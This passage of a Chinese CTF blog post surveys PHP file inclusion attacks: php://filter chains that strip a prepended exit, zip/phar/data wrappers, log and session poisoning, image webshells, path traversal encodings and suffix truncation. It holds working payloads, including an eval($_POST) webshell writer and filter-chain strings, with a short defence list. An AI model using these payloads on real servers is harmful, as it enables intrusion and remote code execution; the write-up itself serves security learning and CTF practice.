+<p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？</p>
+<p>幸运的是，这里的<code>$_POST[&#39;filename&#39;]</code>是可以控制协议的，我们即可使用 php://filter协议来施展魔法：使用php://filter流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</p>
+<p>众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>
+<p>所以，一个正常的base64_decode实际上可以理解为如下两个步骤：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>] = preg_replace(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br><span class="line">base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode  来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p>
+<p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220227220004241.png" alt="image-20220227220004241"></p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#_2">利用字符串操作方法</a></p>
+<p>有的同学说，base64的算法我不懂，上面的方法太复杂了。</p>
+<p>其实，除了使用base64特性的方法外，我们还可以利用php://filter字符串处理方法来去除“死亡exit”。我们观察一下，这个<code>&lt;?php exit; ?&gt;</code>实际上是什么？</p>
+<p>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。</p>
+<p>编写如下测试代码即可查看 php://filter/read=string.strip_tags/resource=php://input 的效果：</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo readfile(&#x27;php<span class="symbol">://filter/read=string</span>.strip_tags/resource=php<span class="symbol">://input</span>&#x27;)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/thum-499a1469385895.png" alt="QQ截图20160725010403.png"></p>
+<p>可见，<code>&lt;?php exit; ?&gt;</code>被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用strip_tags同样会被去除。</p>
+<p>万幸的是，php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p>
+<p>最终的数据包如下：</p>
+<p><img src="https://www.leavesongs.com/content/uploadfile/201607/thum-95b61469385895.png" alt="QQ截图20160725011007.png"></p>
+<p>除此之外，我们还可以利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了：</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/content/uploadfile/201607/1c471469385896.png"><img src="https://www.leavesongs.com/content/uploadfile/201607/thum-1c471469385896.png" alt="QQ截图20160725012639.png"></a></p>
+<p>当然，这个方法的条件就是不开启短标签。</p>
+<p>三、zip://</p>
+<p>zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</p>
+<pre><code>zip://中只能传入绝对路径。
+要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）
+只需要是zip的压缩包即可，后缀名可以任意更改。
+相同的类型的还有zlib://和bzip2://
+</code></pre>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226221548409.png" alt="image-20220226221548409"></p>
+<p>四、data://与phar://</p>
+<p><strong>data://</strong> 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226221636438.png" alt="image-20220226221636438"></p>
+<p><strong>phar://</strong> 有点类似zip://同样可以导致 任意代码执行。</p>
+<ul>
+<li>phar://中相对路径和绝对路径都可以使用<br> <img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20190212183933220.png"></li>
+</ul>
+<p>compress.zlib://   加速读取文件</p>
+<p>zlib 是通用的压缩库，提供了一套 in-memory 压缩和解压函数，并能检测解压出来的数据的完整性(integrity)。zlib 也支持读写 gzip (.gz) 格式的文件。</p>
+<p>int compress(Bytef *dest, uLongf *destLen, const Bytef *source, uLong sourceLen);</p>
+<p>compress函数将 source 缓冲区中的内容压缩到 dest 缓冲区。 sourceLen 表示source 缓冲区的大小(以字节计)。注意函数的第二个参数 destLen 是传址调用。当调用函数时，destLen表示 dest  缓冲区的大小，destLen &gt; (sourceLen + 12)*100.1%。当函数退出后，destLen  表示压缩后缓冲区的实际大小。此时 destLen / sourceLen 正好是压缩率。</p>
+<p>compress 若成功，则返回 Z_OK；若没有足够内存，则返回 Z_MEM_ERROR；若输出缓冲区不够大，则返回 Z_BUF_ERROR。</p>
+<h2 id="0x05-包含Apache日志文件"><a href="#0x05-包含Apache日志文件" class="headerlink" title="0x05 包含Apache日志文件"></a>0x05 包含Apache日志文件</h2><p>WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。</p>
+<p>利用条件：a、对日志文件可读  b、知道日志文件存储目录</p>
+<p>（1）日志的物理存放路径</p>
+<p>（2）存在文件包含漏洞</p>
+<p>（3）curl命令行url请求工具或者burpsuite代理；（避免url转码的存在）</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226221906093.png" alt="image-20220226221906093"></p>
+<p>Apache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。<br>  如果访问一个不存在的资源时，如<a target="_blank" rel="noopener" href="http://www.xxxx.com/">http://www.xxxx.com/</a><?php phpinfo(); ?>,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把<?php phpinfo(); ?> 写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全起见，安装apache时尽量不要使用默认路径。</p>
+<p><strong>获取日志存放路径</strong></p>
+<p><strong>1、日志默认路径</strong></p>
+<p>(1) apache+Linux日志默认路径</p>
+<p> /etc/httpd/logs/access_log   或者   /var/log/httpd/access_log</p>
+<p>(2) apache+win2003日志默认路径</p>
+<p> D:\xampp\apache\logs\access.log</p>
+<p> D:\xampp\apache\logs\error.log</p>
+<p>(3) IIS6.0+win2003默认日志文件</p>
+<p> C:\WINDOWS\system32\Logfiles</p>
+<p>(4) IIS7.0+win2003 默认日志文件</p>
+<p> %SystemDrive%\inetpub\logs\LogFiles</p>
+<p>(5) nginx 日志文件</p>
+<p>日志文件在用户安装目录logs目录下，以我的安装路径为例/usr/local/nginx,那我的日志目录就是在/usr/local/nginx/logs里</p>
+<p><strong>2</strong>、<strong>web中间件默认配置</strong></p>
+<p>(1) apache+linux 默认配置文件</p>
+<p> /etc/httpd/conf/httpd.conf   或者   index.php?page=/etc/init.d/httpd</p>
+<p> (2) IIS6.0+win2003 配置文件</p>
+<p> C:/Windows/system32/inetsrv/metabase.xml</p>
+<p>(3) IIS7.0+WIN 配置文件</p>
+<p> C:\Windows\System32\inetsrv\config\applicationHost.config</p>
+<p><strong>注意：浏览器直接构造的PHP一句话中特殊字符，会被浏览器自动进行URL转义，导致最终写入日志文件中的PHP一句话包含了这些特殊字符，而这些转码后的编码PHP并不能进行正常的解析。</strong></p>
+<p><strong>curl构造一句话时，需要注意两点：</strong></p>
+<p> 1）请求的资源对象，需要被双引号包含，不然会报错；<br> 2） php一句话中的 综括号[ ]curl是特殊符号，需要进行转义 [ ]，不然curl使用时也会报错；</p>
+<p> Curl 命令行url资源请求，没有像浏览器对特殊字符进行url的转码，所以原封不动的将请求报错的php一句话信息写入了服务日志文件中。随后我们利用文件包含漏洞正常包含解析了本地服务器的日志文件中夹带的“php一句话木马”；</p>
+<p>burpsuit 代理抓包改包构造一句话写入日志文件，burpsuit 代理抓包，修改浏览器转码字符，写入正确的php一句话木马到服务器日志文件。</p>
+<p>使用burpsuit修改了浏览器访问转码的字符，事情安装我们一句话原本的格式记录进日志文件，并能被php正常解析。</p>
+<h2 id="0x06-包含SESSION"><a href="#0x06-包含SESSION" class="headerlink" title="0x06 包含SESSION"></a>0x06 包含SESSION</h2><p>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p>
+<p><strong>利用条件：</strong></p>
+<ul>
+<li>找到Session内的可控变量</li>
+<li>Session文件可读写，并且知道存储路径</li>
+</ul>
+<p>php的session文件的保存路径可以在phpinfo的session.save_path看到。</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226222627659.png" alt="image-20220226222627659"></p>
+<p>session常见存储路径：</p>
+<pre><code>/var/lib/php/sess_PHPSESSID
+/var/lib/php/sess_PHPSESSID
+/tmp/sess_PHPSESSID
+/tmp/sessions/sess_PHPSESSID
+session文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到
+</code></pre>
+<h2 id="0x07-包含-pros-self-environ"><a href="#0x07-包含-pros-self-environ" class="headerlink" title="0x07 包含/pros/self/environ"></a>0x07 包含/pros/self/environ</h2><p>proc/self/environ中会保存user-agent头，如果在user-agent中插入php代码，则php代码会被写入到environ中，之后再包含它，即可。</p>
+<p><strong>利用条件：</strong></p>
+<ul>
+<li>php以cgi方式运行，这样environ才会保持UA头。</li>
+<li>environ文件存储位置已知，且environ文件可读。</li>
+</ul>
+<h2 id="0x08-包含临时文件"><a href="#0x08-包含临时文件" class="headerlink" title="0x08 包含临时文件"></a>0x08 包含临时文件</h2><p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
+<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p>
+<p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考参考[LFI With PHPInfo Assistance](<a target="_blank" rel="noopener" href="https://www.insomniasec.com/downloads/publications/LFI">https://www.insomniasec.com/downloads/publications/LFI</a> With PHPInfo Assistance.pdf)</p>
+<h2 id="0x09-包含上传文件"><a href="#0x09-包含上传文件" class="headerlink" title="0x09 包含上传文件"></a>0x09 包含上传文件</h2><p>很多网站通常会提供文件上传功能，比如：上传头像、文档等，这时就可以采取上传一句话图片木马的方式进行包含。</p>
+<p>图片马的制作方式如下，在cmd控制台下输入：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">进入<span class="number">1</span>.<span class="keyword">jph和2.php的文件目录后，执行：</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">copy  <span class="number">1</span>.<span class="keyword">jpg/b+2.php </span> <span class="number">3</span>.<span class="keyword">jpg</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">将图片<span class="number">1</span>.<span class="keyword">jpg和包含php代码的2.php文件合并生成图片马3.jpg</span></span><br></pre></td></tr></table></figure>
+
+<p>假设已经上传一句话图片木马到服务器，路径为/upload/201811.jpg<br>图片代码如下：</p>
+<?fputs(fopen("shell.php","w"),"<?php eval($_POST['pass']);?><p>“)?&gt;</p>
+<pre><code>1
+</code></pre>
+<p>然后访问URL：<a target="_blank" rel="noopener" href="http://www.xxxx.com/index.php?page=./upload/201811.jpg%EF%BC%8C%E5%8C%85%E5%90%AB%E8%BF%99%E5%BC%A0%E5%9B%BE%E7%89%87%EF%BC%8C%E5%B0%86%E4%BC%9A%E5%9C%A8index.php%E6%89%80%E5%9C%A8%E7%9A%84%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%94%9F%E6%88%90shell.php">http://www.xxxx.com/index.php?page=./upload/201811.jpg，包含这张图片，将会在index.php所在的目录下生成shell.php</a></p>
+<h1 id="文件包含漏洞的绕过方法"><a href="#文件包含漏洞的绕过方法" class="headerlink" title="文件包含漏洞的绕过方法"></a>文件包含漏洞的绕过方法</h1><h2 id="0x01-指定前缀绕过"><a href="#0x01-指定前缀绕过" class="headerlink" title="0x01 指定前缀绕过"></a>0x01 指定前缀绕过</h2><h3 id="一、目录遍历"><a href="#一、目录遍历" class="headerlink" title="一、目录遍历"></a>一、目录遍历</h3><p>使用 ../../ 来返回上一目录，被称为目录遍历(Path Traversal)。例如 ?file=../../phpinfo/phpinfo.php<br> 测试代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">	<span class="comment">//前缀</span></span><br><span class="line">	<span class="keyword">include</span> <span class="string">&quot;/var/www/html/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>现在在/var/log目录下有文件flag.txt，则利用…/可以进行目录遍历，比如我们尝试访问：</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>.php?<span class="keyword">file</span>=..<span class="regexp">/../</span>log/flag.txt</span><br></pre></td></tr></table></figure>
+
+<p>则服务器端实际拼接出来的路径为：/var/www/html/../../log/test.txt，即 /var/log/flag.txt，从而包含成功。</p>
+<h3 id="二、编码绕过"><a href="#二、编码绕过" class="headerlink" title="二、编码绕过"></a>二、编码绕过</h3><p>服务器端常常会对于../等做一些过滤，可以用一些编码来进行绕过。</p>
+<p><strong>1.利用url编码</strong></p>
+<ul>
+<li>../<ul>
+<li>%2e%2e%2f</li>
+<li>..%2f</li>
+<li>%2e%2e/</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>%2e%2e%5c</li>
+<li>..%5c</li>
+<li>%2e%2e\</li>
+</ul>
+</li>
+</ul>
+<p><strong>2.二次编码</strong></p>
+<ul>
+<li>../   <ul>
+<li>%252e%252e%252f</li>
+</ul>
+</li>
+<li>..\   <ul>
+<li>%252e%252e%255c</li>
+</ul>
+</li>
+</ul>
+<p><strong>3.容器/服务器的编码方式</strong></p>
+<ul>
+<li><p>../</p>
+<ul>
+<li><p>..%c0%af</p>
+</li>
+<li><p>%c0%ae%c0%ae/</p>
+<p>注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）Apache Tomcat Directory Traversal</p>
+</li>
+</ul>
+</li>
+<li><p>..\</p>
+<ul>
+<li>..%c1%9c</li>
+</ul>
+</li>
+</ul>
+<h2 id="0x10-指定后缀绕过"><a href="#0x10-指定后缀绕过" class="headerlink" title="0x10 指定后缀绕过"></a>0x10 指定后缀绕过</h2><p>后缀绕过测试代码如下，下述各后缀绕过方法均使用此代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">	<span class="comment">//后缀</span></span><br><span class="line">	<span class="keyword">include</span> <span class="variable">$file</span>.<span class="string">&quot;.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="一、利用url"><a href="#一、利用url" class="headerlink" title="一、利用url"></a>一、利用url</h3><p>在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。<br> 可参考此文章：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2c07fbb52b45">URI’s fragment</a></p>
+<p>完整url格式：</p>
+<p>protocol :// hostname[:port] / path / [;parameters][?query]#fragment</p>
+<p><strong>query(?)</strong></p>
+<ul>
+<li>[访问参数] <code>?file=http://localhost:8081/phpinfo.php?</code></li>
+<li>[拼接后]  ?file=<a target="_blank" rel="noopener" href="http://localhost:8081/phpinfo.php?.txt">http://localhost:8081/phpinfo.php?.txt</a></li>
+</ul>
+<p><strong>Example：</strong>（设在根目录下有flag2.txt文件）</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226224648338.png" alt="image-20220226224648338"></p>
+<p><strong>fragment(#)</strong></p>
+<ul>
+<li>[访问参数] <code>?file=http://localhost:8081/phpinfo.php%23</code></li>
+<li>[拼接后]  ?file=<a target="_blank" rel="noopener" href="http://localhost:8081/phpinfo.php#.txt">http://localhost:8081/phpinfo.php#.txt</a></li>
+</ul>
+<p><strong>Example：</strong>（设在根目录下有flag2.txt文件）</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226224742608.png" alt="image-20220226224742608"></p>
+<h3 id="二、利用协议"><a href="#二、利用协议" class="headerlink" title="二、利用协议"></a>二、利用协议</h3><p>利用zip://和phar://，由于整个压缩包都是我们的可控参数，那么只需要知道他们的后缀，便可以自己构建。</p>
+<p>zip://</p>
+<pre><code>[访问参数] ?file=zip://D:\zip.jpg%23phpinfo
+[拼接后]  ?file=zip://D:\zip.jpg#phpinfo.txt
+</code></pre>
+<p>phar://</p>
+<pre><code>[访问参数] ?file=phar://zip.zip/phpinfo
+[拼接后]  ?file=phar://zip.zip/phpinfo.txt
+</code></pre>
+<p>Example：<br>(我的环境根目录中有php.zip压缩包，内含phpinfo.txt，其中包含代码<?php phpinfo();?>)）<br>所以分别构造payload为：</p>
+<p>?file=zip://D:\PHPWAMP_IN3\wwwroot\php.zip%23phpinfo</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226224921625.png" alt="image-20220226224921625"></p>
+<p>?file=phar://../../php.zip/phpinfo</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226224952562.png" alt="image-20220226224952562"></p>
+<h3 id="三、长度截断"><a href="#三、长度截断" class="headerlink" title="三、长度截断"></a>三、长度截断</h3><p>利用条件：</p>
+<pre><code>php版本 &lt; php 5.2.8
+</code></pre>
+<p>原理：</p>
+<pre><code>Windows下目录最大长度为256字节，超出的部分会被丢弃
+Linux下目录最大长度为4096字节，超出的部分会被丢弃。
+</code></pre>
+<p>利用方法：</p>
+<pre><code>只需要不断的重复 ./(Windows系统下也可以直接用 . 截断)
+
+  ?file=./././。。。省略。。。././shell.php
+    1
+</code></pre>
+<p>则指定的后缀.txt会在达到最大值后会被直接丢弃掉</p>
+<p>四、%00截断</p>
+<p>利用条件：</p>
+<pre><code>magic_quotes_gpc = Off
+php版本 &lt; php 5.3.4
+</code></pre>
+<p>利用方法：</p>
+<pre><code>直接在文件名的最后加上%00来截断指定的后缀名
+
+  ?file=shell.php%00
+</code></pre>
+<p>注：现在用到%00阶段的情况已经不多了</p>
+<p>文件包含漏洞防御</p>
+<pre><code>allow_url_include和allow_url_fopen最小权限化
+
+设置open_basedir（open_basedir 将php所能打开的文件限制在指定的目录树中）
+
+白名单限制包含文件，或者严格过滤 
+</code></pre>
+<h2 id="0x11-file-put-content"><a href="#0x11-file-put-content" class="headerlink" title="0x11 file_put_content"></a>0x11 <strong>file_put_content</strong></h2><p>file_put_content大概有三种情形出现；</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file<span class="constructor">_put_contents($<span class="params">filename</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.$<span class="params">content</span>)</span>;</span><br><span class="line">file<span class="constructor">_put_contents($<span class="params">content</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.$<span class="params">content</span>)</span>;</span><br><span class="line">file<span class="constructor">_put_contents($<span class="params">filename</span>,$<span class="params">content</span> . <span class="string">&quot;\nxxxxxx&quot;</span>)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>思路一般是想要将杂糅或者死亡代码分解掉；这里思路基本上都是利用php伪协议filter，结合编码或者相应的过滤器进行绕过；其原理不外乎是将死亡或者杂糅代码分解成php无法识别的代码；</p>
+<h3 id="首先对于第一种情况"><a href="#首先对于第一种情况" class="headerlink" title="首先对于第一种情况"></a><strong>首先对于第一种情况</strong></h3><p>直观的看到，我们的文件名和文件内容都是可控的，这种的相对来说简单的多，我们直接控制文件名，和文件内容即可，下面分享几种方式；</p>
+<ol>
+<li>  <strong>base64编码绕过</strong></li>
+</ol>
+<p>原理其实很简单，利用base64解码，将死亡代码解码成乱码，使得php引擎无法识别；</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$file</span>name=<span class="string">&#x27;php://filter/convert.base64-decode/resource=s1mple.php&#x27;</span>;</span><br><span class="line"><span class="symbol">$co</span>ntent = <span class="string">&#x27;aPD9waHAgcGhwaW5mbygpOz8+&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里之所以将$content加了一个a，是因为base64在解码的时候是将4个字节转化为3个字节，又因为死亡代码只有phpexit参与了解码，所以补上一位就可以完全转化；载荷效果如下：</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPLN4K.png" alt="img"></p>
+<ol start="2">
+<li> <strong>rot13 编码绕过</strong></li>
+</ol>
+<p>原理和base64一样，可以直接转码分解死亡代码；</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220228211810119.png" alt="image-20220228211810119"></p>
+<p>只是这种方法有点尴尬的是；因为我们生成的文件内容之中前面的<code>&lt;?</code>并没有分解掉，这时，如果服务器开启了短标签，那么就会被解析，所以所以后面的代码就会错误；也就失去了作用；</p>
+<p><strong>3.    .htaccess的预包含利用</strong></p>
+<p>利用 .htaccess的预包含文件的功能来进行攻破；自定义包含我们的flag文件。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span>=php:<span class="regexp">//</span>filter<span class="regexp">/write=string.strip_tags/</span>resource=.htaccess</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span>=?&gt;php_value%<span class="number">20</span>auto_prepend_file%<span class="number">20</span>G:\s1mple.php</span><br></pre></td></tr></table></figure>
+
+<p>同时传入如上的代码，首先来解释$filename的代码，这里引用了string.strip_tags过滤器，可以过滤.htaccess内容的html标签，自然也就消除了死亡代码；$content即闭合死亡代码使其完全消除，并且写入自定义包含文件；实验结果如下所示：</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPHLCD.png" alt="img"></p>
+<p>但是这种方法也是具有一定的局限性，首先我们需要知道flag文件的位置，和文件的名字，一般的比赛中可以盲猜  flag.php flag   /flag  /flag.php  等等；另外还有个很大的问题是，string.strip_tags过滤器只是可以在php5的环境下顺利的使用，如果题目环境是在php7.3.0以上的环境下，则会发生段错误。导致写不进去；根本来说是php7.3.0中废弃了string.strip_tags这个过滤器；</p>
+<ol start="4">
+<li> <strong>过滤器编码组合拳</strong></li>
+</ol>
+<p>过滤器组合拳，其实故名思意，就是利用过滤器嵌套过滤器进行过滤，以此达到代码的层层更迭，从而最后写入我们期望的代码；</p>
+<p><strong>先来一种：</strong></p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$file</span>name=<span class="string">&#x27;php://filter/string.strip_tags|convert.base64-decode/resource=s1mple.php&#x27;</span></span><br><span class="line"><span class="symbol">$co</span>ntent=<span class="string">&#x27;?&gt;PD9waHAgcGhwaW5mbygpOz8+&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到，利用string.strip_tags可以过滤掉html标签，将标签内的所有内容进行删去，然后再进行base64解码，成功写入shell；</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPLobn.png" alt="img"></p>
+<p>但是这种方法有一定的局限性也还是因为string.strip_tags在php7.3.0以上的环境下会发生段错误，从而导致无法写入，但是在php5的环境下则不受此影响；</p>
+<p><strong>再来另外一种</strong></p>
+<p>如果题目的环境是php7的话，那么我们又该如何？这里受一个题目的启发，也可以使用过滤器进行嵌套来做；组合拳；这里三个过滤器叠加之后先进行压缩，然后转小写，最后解压，会导致部分死亡代码错误；则可以写入shell；</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span>=php:<span class="comment">//filter/zlib.deflate|string.tolower|zlib.inflate|/resource=s1mple.php</span></span><br><span class="line"><span class="variable">$content</span>=php:<span class="comment">//filter/zlib.deflate|string.tolower|zlib.inflate|<span class="meta">?&gt;</span><span class="meta">&lt;?php</span>%0dphpinfo();<span class="meta">?&gt;</span>/resource=s1mple.php</span></span><br></pre></td></tr></table></figure>
+
+<p>如此便可以写入；其原理也很简单，就是利用过滤器嵌套让死亡代码在各种变换之间进行分解扰乱，然后再次写入木马；</p>
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/08/14/dPHcNT.png"><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPHcNT.png" alt="img"></a></p>
+<p>这里非常巧合的是内容经过压缩转小写然后解压之后，我们的目的代码并没有发生变化，这也为写入木马奠定了基础；</p>
+<h3 id="介绍第二种情况"><a href="#介绍第二种情况" class="headerlink" title="介绍第二种情况"></a><strong>介绍第二种情况</strong></h3><p><code>file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);</code>如此又该如何；</p>
